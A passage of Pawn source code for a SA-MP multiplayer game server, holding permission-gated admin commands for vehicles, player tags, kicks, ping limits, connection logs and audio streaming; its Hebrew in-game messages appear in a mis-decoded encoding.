		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		new Float:distance = 999.0, Float:p[3], id = -1;
		for(new i = 0; i < max_objects; i++)
		{
			GetSObjectPos(i,p[0],p[1],p[2]);
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) < distance) distance = GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]), id = i;
		}
		if(id != -1) DestroySObject(id);
		return 1;
	}
	if(equal(cmd,"/vsaveall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		new string[M_S], File:f = fopen("/DM/SaveAll.txt",io_write);
		for(new i=0;i<MAX_VEHICLES;i++)
		{
			if(IsValidVehicle(i))
			{
				format(string,sizeof(string),"CreateVehicleEx(%d,%.6f,%.6f,%.6f,%.6f,%d,%d,respawntime,%d,%d);\r\n",GetVehicleModel(i),vehicleinfo[i][vpos][0],vehicleinfo[i][vpos][1],vehicleinfo[i][vpos][2],vehicleinfo[i][vpos][3],vehicleinfo[i][vcol][0],vehicleinfo[i][vcol][1],vehicleinfo[i][veint],vehicleinfo[i][veworld]);
				fwrite(f,string);
			}
		}
		fclose(f);
		SendClientMessage(playerid,yellow," .ыь ф°ысщэ Ё∙ю°х");
		SendClientMessage(playerid,yellow,"\"/DM/SaveAll.txt\"");
		return 1;
	}
	if(equal(cmd,"/kickafk") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		new string[M_S], c = 0;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][modeafk]) c++;
		if(!c) return SendClientMessage(playerid,red," .AFK рщя ∙чўЁщэ сюЎс");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][modeafk] && playerinfo[i][admin] < playerinfo[playerid][admin]) SetKick(i,playerid,"AFK Kick");
		format(string,sizeof(string)," .AFK Ё·я ўщў ьыь ф∙чўЁщэ сюЎс %s фрующя",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/xnocmd") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		new cmd2[64], id, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /xnocmd [id/name] [off/on] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) playerinfo[id][nocmd] = 0;
		else if(equal(cmd2,"on")) playerinfo[id][nocmd] = 1;
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		format(string,sizeof(string),playerinfo[id][nocmd] ? (" .(тщ∙ф ьы·хс Їўхух· (ь·ющу %s фх°у· ь") : (" .(тщ∙ф ьы·хс Їўхух· (ь·ющу %s Ё·· ь"),GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green,playerinfo[id][nocmd] ? (" .(фрующя фх°щу ьъ р· фтщ∙ф ьы·хс Їўхух· (ь·ющу") : (" .(фрующя Ё·я ьъ тщ∙ф ьы·хс Їўхух· (ь·ющу"));
		if(playerinfo[id][logged]) fsetint(fuser(id),"XNoCMD",playerinfo[id][nocmd]);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/saveplace") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		cmd = strrest(cmdtext,idx);
		new Float:p[3], id = -1, key[32];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i = 0; i < MAX_PLACES && id == -1; i++) if(!placeinfo[i][plValid]) id = i;
		placeinfo[id][plValid] = 1;
		format(key,sizeof(key),"Place%d",id);
		fsetstring(file_places,key,cmd);
		format(key,sizeof(key),"Place%dX",id);
		fsetfloat(file_places,key,p[0]);
		format(key,sizeof(key),"Place%dY",id);
		fsetfloat(file_places,key,p[1]);
		format(key,sizeof(key),"Place%dZ",id);
		fsetfloat(file_places,key,p[2]);
		format(key,sizeof(key),"Place%dText",id);
		fsetstring(file_places,key,"TODO");
		SendClientMessage(playerid,green," :Ё∙ю°");
		SendClientMessage(playerid,green,cmd);
		return 1;
	}
	if(equal(cmd,"/vamount") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		new string[M_S], Float:p[4], vmodel, avid = INVALID_VEHICLE_ID, amount, Float:dis, iw[2];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vamount [amount] [dis] [vehicle name/model] :Ўх°· ф∙щюх∙");
		amount = strval(cmd), cmd = strtok(cmdtext,idx), dis = floatstr(cmd), cmd = strtok(cmdtext,idx), vmodel = IsNumeric(cmd) ? strval(cmd) : GetVehicleModelIDFromName(cmd);
		if(vmodel < 400 || vmodel > 611) return SendClientMessage(playerid,red," .∙э ф°ыс рх юхуь ∙тхщ");
		for(new i = 0; i < MAX_ADMIN_VEHICLES && avid == INVALID_VEHICLE_ID; i++) if(playerinfo[playerid][createdv][i] == INVALID_VEHICLE_ID) avid = i;
		if(avid != 0 || amount > MAX_ADMIN_VEHICLES) return SendClientMessage(playerid,red," .ыь рующя щыхь ьщЎх° Єу " #MAX_ADMIN_VEHICLES " °ысщэ у°ъ фрующя, Ёр ьючхў чьў Єь юЁ· ьщЎх° Єху");
		GetPlayerFacingAngle(playerid,p[3]);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		iw[0] = GetPlayerInterior(playerid), iw[1] = GetPlayerVirtualWorld(playerid);
		for(new i = 0; i < amount; i++)
		{
			GetXYInFrontOfPoint(p[0],p[1],p[3],dis);
			playerinfo[playerid][createdv][i] = CreateVehicleEx(vmodel,p[0],p[1],p[2],p[3]+90,-1,-1,respawntime,iw[0],iw[1]);
		}
		playerinfo[playerid][createdvs] = amount;
		GetXYInFrontOfPlayer(playerid,p[0],p[1],IsPlayerInAnyVehicle(playerid)? 8.0:5.0);
		format(string,sizeof(string)," %s :ЁхЎ°х %d °ысщэ",GetVehicleName(vmodel),amount);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/vsall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		if(!playerinfo[playerid][createdvs]) return SendClientMessage(playerid,red," .ьр щЎ°· °ысщэ");
		cmd = strrest(cmdtext,idx);
		new string[M_S], File:f = fopen("/DM/SaveAll.txt",io_append);
		for(new i = 0, j = 0, Float:p[4]; j < playerinfo[playerid][createdvs]; j++)
		{
			i = playerinfo[playerid][createdv][j];
			GetVehiclePos(i,p[0],p[1],p[2]);
			GetVehicleZAngle(i,p[3]);
			format(string,sizeof(string),"CreateVehicleEx(%d,%.4f,%.4f,%.4f,%.4f,%d,%d,respawntime,%d,%d); // [%s] %s\r\n",GetVehicleModel(i),p[0],p[1],p[2],p[3],vehicleinfo[i][newvcol][0],vehicleinfo[i][newvcol][1],vehicleinfo[i][veint],vehicleinfo[i][veworld],GetVehicleName(GetVehicleModel(i)),cmd);
			fwrite(f,string);
		}
		fclose(f);
		format(string,sizeof(string)," .∙ю° р· ыь ф°ысщэ ∙щщЎ° %s",GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	// /addhelper /delhelper /taghelper
	if(equal(cmd,"/addhelper") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /addhelper [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(PlayerHasRank(id,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ыс° сЎхх· ф∙°·");
		playerinfo[id][rank][RankID("Ўхх· ф∙°·")] = 1;
		format(string,sizeof(string),"Rank%02d",RankID("Ўхх· ф∙°·"));
		fsetint(fuser(id),string,1);
		format(string,sizeof(string)," .тщ∙х· ь·ющыф %s-фхёЇ· ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя фхёщє ьъ тщ∙х· ь·ющыф");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/delhelper") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /delhelper [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!PlayerHasRank(id,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр сЎхх· ф∙°·");
		playerinfo[id][rank][RankID("Ўхх· ф∙°·")] = 0;
		format(string,sizeof(string),"Rank%02d",RankID("Ўхх· ф∙°·"));
		fsetint(fuser(id),string,0);
		format(string,sizeof(string)," .р· фтщ∙х· ь·ющыф %s-фё°· ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя фёщ° р· тщ∙х· ф·ющыф ∙ьъ");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/taghelper") && IsPlayerMAdmin(playerid))
	{
		if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[64], id, string[M_S], use = 0;
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /taghelper [id/name] [on/off] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) use = 0;
		else if(equal(cmd2,"on")) use = 1;
		else return SendClientMessage(playerid,red," .∙тщрф сЇ°юш° ф∙ьщ∙щ");
		if(use)
		{
			if(strfind(playerinfo[id][tag],"Helper") != -1) return SendClientMessage(playerid,red," .ью∙·ю∙ цф ыс° щ∙ ·рт ∙ь Ўхх· ф∙°·");
			format(playerinfo[id][tag],32,"Helper");
			playerinfo[id][tagcol] = -1;
			if(playerinfo[id][logged])
			{
				fsetstring(fuser(id),"Tag2",playerinfo[id][tag]);
				fsetint(fuser(id),"TagColor",-1);
			}
			format(string,sizeof(string)," .·рт ∙ь Ўхх· ф∙°· %s-фхёЇ· ь",GetName(id));
			SendClientMessage(playerid,green,string);
			SendClientMessage(playerid,green," .фрующя фхёщє ьъ ·рт ∙ь Ўхх· ф∙°·");
		}
		else
		{
			if(strfind(playerinfo[id][tag],"Helper") == -1) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя ·рт ∙ь Ўхх· ф∙°·");
			format(playerinfo[id][tag],32,"x");
			playerinfo[id][tagcol] = -1;
			if(playerinfo[id][logged])
			{
				fsetstring(fuser(id),"Tag2","x");
				fsetint(fuser(id),"TagColor",-1);
			}
			format(string,sizeof(string)," .р· ф·рт ∙ь Ўхх· ф·ющыф %s-фё°· ь",GetName(id));
			SendClientMessage(playerid,green,string);
			SendClientMessage(playerid,green," .фрующя фёщ° р· ·рт Ўхх· ф·ющыф ∙ьъ");
		}
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/gmx") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S];
		format(string,sizeof(string)," *** Game Mode Exit by %s ***",GetName(playerid));
		SendClientMessageToAll(white,string);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][logged]) fsetint(fuser(i),"LastMoney",GetMoney(i));
		restarting = true;
		GameModeExit();
		return 1;
	}
	if(equal(cmd,"/setmaxping") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new maxp, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setmaxping [max ping] :Ўх°· ф∙щюх∙");
		maxp = strval(cmd);
		if(maxp < 250 || maxp > 65535) return SendClientMessage(playerid,red," .юёЇ° юўёщюхэ ЇщЁт ∙тхщ");
		max_ping = maxp;
		format(string,sizeof(string)," .∙щЁф р· юёЇ° фюўёщюхэ ЇщЁт ь %d %s фрующя",maxp,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd, "/setmaxcapture") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new maxp, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setmaxcapture [amount] :Ўх°· ф∙щюх∙");
		maxp = strval(cmd);
		if(maxp < 1 || maxp > max_clan_members) return SendClientMessage(playerid,red," .юёЇ° ∙тхщ");
		capturemembers = maxp;
		format(string,sizeof(string)," .∙щЁф р· Ўх°ъ ф∙чўЁщэ ьф∙·ьшх· Єь юЇўуф ь %d %s фрующя",maxp,GetName(playerid));
		SendClientMessageToAll(orange,string);
	}
	if(equal(cmd, "/setftttime") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new maxp, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setftttime [seconds] :Ўх°· ф∙щюх∙");
		maxp = strval(cmd);
		if(maxp < 10 || maxp > 7200) return SendClientMessage(playerid,red," .цюя ∙тхщ");
		def_ftttime = maxp;
		format(string,sizeof(string)," .∙щЁф р· ыюх· ф∙Ёщх· ∙Ёщ·я ьюЎхр р· фюшюхя %d %s фрующя",maxp,GetName(playerid));
		SendClientMessageToAll(orange,string);
	}
	if(equal(cmd,"/blockpms") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /blockpms [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][blockpms] = 1;
			SendClientMessage(playerid,green," .юЄы∙щх ьр ·ўсь фхуЄх· Ї°шщх·");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][blockpms] = 0;
			SendClientMessage(playerid,green," .юЄы∙щх ·ўсь фхуЄх· Ї°шщх·");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/blockgoto") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 13");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /blockgoto [on/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"on"))
		{
		    fsetint(fuser(playerid), "blockgoto", 1);
			playerinfo[playerid][blockgoto] = 1;
			SendClientMessage(playerid,green," .юЄы∙щх Ёчёюх ∙щтх°щэ рьщъ");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
		    fsetint(fuser(playerid), "blockgoto", 0);
			playerinfo[playerid][blockgoto] = 0;
			SendClientMessage(playerid,green," .юЄы∙щх щрхЇ∙°х ∙щтх°щэ рьщъ");
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/settag") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new tag2[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), tag2 = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(tag2))
		{
			SendClientMessage(playerid,white," /settag [id/name] [new tag] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," .рх· рч· = сьщ ·т");
			return 1;
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(strlen(cmd) > 30) return SendClientMessage(playerid,red," .ф·рт р°хъ юущ");
		format(string,sizeof(string)," .%s ь %s ∙щЁщ· р· ф·т ∙ь",tag2,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s фрующя ∙щЁф р· ф·т ∙ьъ ь",tag2);
		SendClientMessage(id,green,string);
		format(playerinfo[id][tag],32,tag2);
		if(playerinfo[id][logged]) fsetstring(fuser(id),"Tag2",tag2);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/gettag") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /gettag [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(strlen(playerinfo[id][tag]) < 2) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя ·рт");
		format(string,sizeof(string)," :юхЇщЄ сЎсЄ ффхуЄф фцх хфхр %s ф·рт ∙ь",GetName(id));
		SendClientMessage(playerid, playerinfo[id][tagcol], string);
		SendClientMessage(playerid, playerinfo[id][tagcol], playerinfo[id][tag]);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/settagcolor") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new id, string[M_S], rgb[3], final = -2;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /settagcolor [id/name] [red] [green] [blue] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /settagcolor [id/name] [color name] :Ўх°· ф∙щюх∙ #2");
			SendClientMessage(playerid,white," /settagcolor [id/name] def :ыущ ьфчцщ° ь∙чўя р· ЎсЄ ф·рт ф°тщь");
			SendClientMessage(playerid,white," /colors :°∙щю· ∙юх· ЎсЄщэ");
			return 1;
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) cmd = "def";
		if(IsNumeric(cmd))
		{
			for(new i = 0; i < 3; i++)
			{
				rgb[i] = strval(cmd);
				if(i < 2) cmd = strtok(cmdtext,idx);
			}
			final = rgba2hex(rgb[0],rgb[1],rgb[2],255);
		}
		else
		{
			if(equal(cmd,"def")) final = -1;
			else for(new i = 0; i < sizeof(Colors); i++) if(equal(cmd,Colors[i][colName])) final = Colors[i][colHex];
		}
		if(final == -2) return SendClientMessage(playerid,red," .ЎсЄ ∙тхщ");
		else if(final == -1)
		{
			format(string,sizeof(string)," .ьЎсЄ ф·рт фсёщёщ %s ∙щЁщ· р· ЎсЄ ф·рт ∙ь",GetName(id));
			SendClientMessage(playerid,white,string);
			SendClientMessage(id,white," .фрующя ∙щЁф р· ЎсЄ ф·рт ∙ьъ ьЎсЄ ф·рт фсёщёщ");
		}
		else
		{
			format(string,sizeof(string)," .ьЎсЄ ффхуЄф фцх %s ∙щЁщ· р· ЎсЄ ф·рт ∙ь",GetName(id));
			SendClientMessage(playerid,final,string);
			SendClientMessage(id,final," .фрующя ∙щЁф р· ЎсЄ ф·рт ∙ьъ ьЎсЄ ффхуЄф фцх");
		}
		playerinfo[id][tagcol] = final;
		if(playerinfo[id][logged]) fsetint(fuser(id),"TagColor",final);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setlname") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new lvlname[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), lvlname = strrest(cmdtext,idx);
		if(!strlen(cmd) || !strlen(lvlname))
		{
			SendClientMessage(playerid,white," /setlname [id/name] [text] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," .рх· рч· = ∙э °юф °тщь");
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		format(string,sizeof(string)," .%s ь %s ∙щЁщ· р· ∙э ф°юф ∙ь",lvlname,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%s фрующя ∙щЁф р· ∙э ф°юф ∙ьъ ь",lvlname);
		SendClientMessage(id,green,string);
		if(strlen(lvlname) > 1)
		{
			format(playerinfo[id][slevelname],64,lvlname);
			if(playerinfo[id][logged]) fsetstring(fuser(id),"PlayerLevelName",lvlname);
		}
		return 1;
	}
	if(equal(cmd,"/clogs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new f[64], string[M_S], uname[256];
		cmd = strtok(cmdtext,idx), uname = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(uname)) return SendClientMessage(playerid,white," /clogs [show/clear] [name] :Ўх°· ф∙щюх∙");
		format(f,sizeof(f),"/DM/Users/%s.ini",uname);
		if(!fexist(f)) return SendClientMessage(playerid,red," .ыщЁхщ ∙тхщ");
		if(equal(cmd,"show"))
		{
			format(string,sizeof(string)," ~~~ :%s - Ї°шщ ыЁщёх· ~~~",uname);
			SendClientMessage(playerid,lightblue,string);
			format(string,sizeof(string)," ·р°щъ ыЁщёф рч°хЁф: %d.%d.%d",fgetint(f,"LastConnectDay"),fgetint(f,"LastConnectMonth"),fgetint(f,"LastConnectYear"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," ∙Є· ыЁщёф рч°хЁф: %s",fgetstring(f,"LastConnectTime"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," уўх· с∙°·: %d",fgetint(f,"TimeInServer"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," уўх· с∙°· ёф\"ъ: %d",fgetint(f,"TotalTimeInServer"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," ущххчщэ ∙шхЇьх: %d",fgetint(f,"Reports"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string),"check connect logs of %s",uname);
			Log("Attention",playerid,string);
		}
		else if(equal(cmd,"clear"))
		{
			fsetint(f,"TimeInServer",0);
			fsetint(f,"Reports",0);
			format(string,sizeof(string)," .%s :Ёхўх ьхтщэ",uname);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string),"clear connect logs of %s",uname);
			Log("Attention",playerid,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/amusic") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("∙у°Ёщэ"))))
	{
	    if(playerinfo[playerid][admin] < 17 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("∙у°Ёщэ"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /amusic [play/autoplay/list/stop/play4me] :Ўх°· ф∙щюх∙");
		new string[M_S];
		if(equal(cmd,"play"))
		{
			if(currentShow[0] != -1) return SendClientMessage(playerid,red," .ьр сцюя ффхЇЄф");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /amusic play [url]");
				return SendClientMessage(playerid,red," .°ў ы·хсх· Єэ ёщхю· ю·рщюф щЄсух .YouTube-∙щэ ьс! ьр ыь ёхт ∙ь юхцщўф щЄсху, тэ ьр ўщ∙х°щэ ь");
			}
			format(adminmusic,sizeof(adminmusic),cmd);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
			{
				playerinfo[i][playingmusic] = 0;
				PlayAudioStreamForPlayer(i,cmd);
				playerinfo[i][playingmusic] = 1;
			}
			SendClientMessage(playerid,red," (/amusic stop !∙щэ ьс: фЇЄь· юхцщўф хфщр ·∙юЄ ьыь ющ ∙ЁыЁё ь∙°·. рэ фюхцщўф ьр Єхсу· сшь рх·ф)");
			format(string,sizeof(string)," .(/play :ьфЇЄьф счц°ф ,/saudio :ю∙ющЄ ыЄ· юхцщўф ьыхьэ (ьыщсхщ %s фрующя",GetName(playerid));
			SendClientMessageToAll(white,string);
		}
		else if(equal(cmd,"autoplay"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /amusic autoplay [on/off] :Ўх°· ф∙щюх∙");
			if(equal(cmd,"on"))
			{
			    if(autoplay) return SendClientMessage(playerid,red," .ффЇЄьф фрхшхюшщ· ыс° ЇЄщьф");
			    autoplay = true;
			    musictimer = 0;
			    format(string,sizeof(string)," .фЇЄщь р· ффЇЄьф фрхшхюшщ· ь∙щ°щэ %s фрующя",GetName(playerid));
				SendClientMessageToAll(white,string);
			}
			else if(equal(cmd,"off"))
			{
			    if(!autoplay) return SendClientMessage(playerid,red," .ффЇЄьф фрхшхюшщ· рщЁф ЇЄщьф");
			    autoplay = false;
			    musictimer = 0;
			    format(string,sizeof(string)," .сщшь р· ффЇЄьф фрхшхюшщ· ь∙щ°щэ %s фрующя",GetName(playerid));
				SendClientMessageToAll(white,string);
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		}
		else if(equal(cmd,"list"))
		{
		    new list[1024];
			for(new i = 0; i < sizeof(AMusicList); i++) format(list,sizeof(list),!strlen(list) ? ("%s {%s}Х %d) %s") : ("%s\n {%s}Х %d) %s"),list,HexStringOfColor(i % 2 == 0 ? green : lightgreen),i+1,AMusicList[i][amTitle]);
			ShowPlayerDialog(playerid,dialog_amusic,DIALOG_STYLE_LIST,@c(lightblue) "°∙щю· юхцщўф ьф∙юЄф",list,"счщ°ф","сщшхь");
		}
		else if(equal(cmd,"stop"))
		{
